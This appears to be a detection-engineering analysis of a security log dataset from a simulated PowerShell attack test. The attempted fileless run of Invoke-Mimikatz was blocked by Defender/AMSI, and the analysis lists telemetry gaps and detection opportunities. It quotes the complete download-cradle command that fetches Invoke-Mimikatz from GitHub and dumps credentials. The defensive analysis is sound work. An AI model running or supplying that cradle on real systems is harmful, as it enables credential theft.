# T1059.001-1: Mimikatz — Execute Invoke-Mimikatz PowerShell Script

## Technique Context

T1059.001 (Command and Scripting Interpreter: PowerShell) covers the use of PowerShell as an execution engine for malicious payloads. This specific test implements the classic "fileless" attack pattern: download a script from the internet and execute it entirely in memory using `IEX (New-Object Net.WebClient).DownloadString('URL')`. The payload here is Invoke-Mimikatz.ps1 from the PowerSploit framework — a PowerShell-reflective port of Mimikatz that performs credential dumping via in-memory DLL injection.

This is arguably the most well-known PowerShell attack pattern in existence. It combines two dangerous capabilities: (1) a download cradle that fetches malicious code without touching disk, and (2) reflective PE injection that loads Mimikatz into the PowerShell process's memory space.

The detection community has invested heavily in catching this pattern:

- **PowerShell ScriptBlock Logging (EID 4104)** captures the actual script content — both the download cradle and the Mimikatz payload itself. This is considered the gold standard because it survives obfuscation of the command line.
- **AMSI (Antimalware Scan Interface)** scans script content at runtime, even for content fetched via `IEX`. Modern Defender uses this to block known-malicious scripts before they execute.
- **Command-line logging (Security 4688 / Sysmon EID 1)** captures the `IEX (New-Object Net.WebClient).DownloadString(...)` cradle pattern.
- **Network connections from PowerShell (Sysmon EID 3)** to external hosts are unusual and worth flagging.

## What This Dataset Contains

The **Security 4688** event captures the complete attack command line:

```
cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString(
'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1');
Invoke-Mimikatz -DumpCreds"
```

This is a textbook download cradle — `IEX` + `DownloadString` + a URL pointing to a known-malicious script, followed by `Invoke-Mimikatz -DumpCreds`. Detection rules matching on any of these substrings would fire.

The Sysmon channel contains two high-value behavioral events:

- **EID 8 (CreateRemoteThread)**: PowerShell (the test framework process) created a remote thread into another process (PID 1340). The target shows as `<unknown process>` because it exited before Sysmon could resolve the image name. PowerShell creating remote threads is inherently suspicious — it is the mechanism behind reflective DLL injection.

- **EID 10 (ProcessAccess)**: PowerShell opened a process with `GrantedAccess: 0x1FFFFF` (PROCESS_ALL_ACCESS). While in this case the target was the test framework's own `whoami.exe` child (a false positive for the T1055.001 Sysmon rule tag), PROCESS_ALL_ACCESS from PowerShell to any process remains a noteworthy behavioral indicator.

The Security channel also captured a **4703 (Token Right Adjusted)** event showing 11 sensitive privileges being enabled on the PowerShell process, including SeSecurityPrivilege, SeLoadDriverPrivilege, and SeBackupPrivilege. This wide privilege enablement in a PowerShell session is unusual and independently suspicious.

An interesting forensic detail: the Security channel shows **SecurityHealthService.exe being spawned by services.exe** (EID 4688) and a corresponding service logon (EID 4624, Type 5) immediately after the blocked payload. This is Defender restarting its health service in response to detecting the attack — itself an artifact that correlates with security control intervention.

## What This Dataset Does Not Contain

The technique was **blocked by Windows Defender / AMSI**. The child cmd.exe exited with `0xC0000022` (STATUS_ACCESS_DENIED). This means AMSI detected the Invoke-Mimikatz signature either during the download response or when PowerShell attempted to execute the script content.

**No Mimikatz script content in PowerShell ScriptBlock Logging (EID 4104).** This is the most significant gap. All 39 EID 4104 events are internal PowerShell error-formatting templates (`Set-StrictMode -Version 1; $_.PSMessageDetails` and similar). The inner `powershell.exe` process that would have executed the `IEX` call was killed before ScriptBlock Logging could fire. In a scenario where the script executes successfully, you would expect hundreds of EID 4104 events containing fragments of the ~3,000-line Invoke-Mimikatz.ps1 script — including function definitions, Win32 API declarations, and the `sekurlsa::logonpasswords` credential dump logic. That content is absent here.

**No network connection events (Sysmon EID 3 or EID 22).** Because AMSI blocked execution before or during the download, there is no DNS query to `raw.githubusercontent.com` and no outbound HTTPS connection from PowerShell. A successful execution would show the full network chain, which is a valuable detection vector in its own right (PowerShell connecting to GitHub raw content URLs).

## Assessment

This dataset represents a **realistic enterprise scenario** — an attacker attempts the most common fileless attack pattern and Defender/AMSI blocks it. The command-line cradle pattern is fully captured in Security 4688 and provides an excellent basis for string-matching and regex-based detections.

The gap to be aware of is that the behavioral and content-based detection channels are empty. PowerShell ScriptBlock Logging — which the community considers the most robust defense against PowerShell-based attacks because it captures content even through obfuscation layers — has no technique-relevant entries. Network-based detections (anomalous PowerShell outbound connections) also have no data to work with.

For building detection coverage around T1059.001 download cradles, the command-line evidence here is solid. For building content-based detections (matching on Mimikatz function names, Win32 API calls, or credential dumping patterns within script blocks), a companion dataset where the script successfully executes would be needed.

## Detection Opportunities Present in This Data

1. **Download cradle command-line pattern** (Security 4688): `IEX`, `DownloadString`, `Net.WebClient` in any process command line. Also: URL substrings like `PowerSploit`, `Invoke-Mimikatz`, `Exfiltration/`.

2. **Layered execution** (Security 4688): `powershell.exe` spawning `cmd.exe /c powershell.exe "..."` — the double-PowerShell-via-cmd pattern is a common evasion technique and worth alerting on.

3. **CreateRemoteThread from a scripting engine** (Sysmon EID 8): PowerShell should essentially never call `CreateRemoteThread` in legitimate operations. This is a strong behavioral indicator of reflective injection.

4. **Broad privilege enablement** (Security 4703): A PowerShell process enabling SeSecurityPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, and SeRestorePrivilege simultaneously warrants investigation.

5. **Defender service restart correlated with PowerShell execution** (Security 4688 + 4624): SecurityHealthService.exe starting immediately after a PowerShell session indicates Defender detected and reacted to something.

6. **Set-ExecutionPolicy Bypass** (PowerShell 4103): While common in legitimate automation, `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` in the context of other suspicious activity is a strong corroborating indicator.
